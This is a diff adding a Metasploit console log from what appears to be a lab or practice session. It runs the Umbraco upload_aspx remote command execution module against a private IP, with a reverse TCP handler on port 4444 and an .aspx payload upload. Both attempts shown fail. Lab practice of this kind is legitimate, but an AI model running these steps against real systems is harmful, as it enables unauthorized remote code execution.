@@ -1,0 +1,52 @@
+[1m[34m[*][0m Spooling to file msfconsole.log...
+[4mmsf5[0m [0m> search umbraco
+[0m
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/windows/http/[45mumbraco[0m_upload_aspx  2012-06-28       [32mexcellent[0m  No     [45mUmbraco[0m CMS Remote Command Execution
+
+
+[4mmsf5[0m [0m> use exploit/windows/http/umbraco_upload_aspx
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> show options
+[0m
+Module options (exploit/windows/http/umbraco_upload_aspx):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /umbraco/        yes       The URI path of the Umbraco login page
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Umbraco CMS 4.7.0.378 / Microsoft Windows 7 Professional 32-bit SP1
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> set RHOSTS 10.10.190.97
+[0mRHOSTS => 10.10.190.97
+[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.8.21.42:4444 
+[1m[34m[*][0m Uploading 372927 bytes through /umbraco/webservices/codeEditorSave.asmx...
+[1m[34m[*][0m Uploading to /umbraco/sGhqqRC.aspx
+[1m[34m[*][0m Didn't get the expected 500 error code /umbraco/webservices/codeEditorSave.asmx [500 OK]. Trying to execute the payload anyway
+[1m[34m[*][0m Executing /umbraco/sGhqqRC.aspx...
+[1m[31m[-][0m Execution failed on /umbraco/sGhqqRC.aspx [404 Not Found]
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> set TR[KARGETURI /umbraco#/login
+[0mTARGETURI => /umbraco#/login
+[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> set TARGETURI /umbraco#/loginexploit[K
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.8.21.42:4444 
+[1m[31m[-][0m Exploit failed: NoMethodError undefined method `path' for "/umbraco":String
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mwindows/http/umbraco_upload_aspx[0m) [0m> [0m
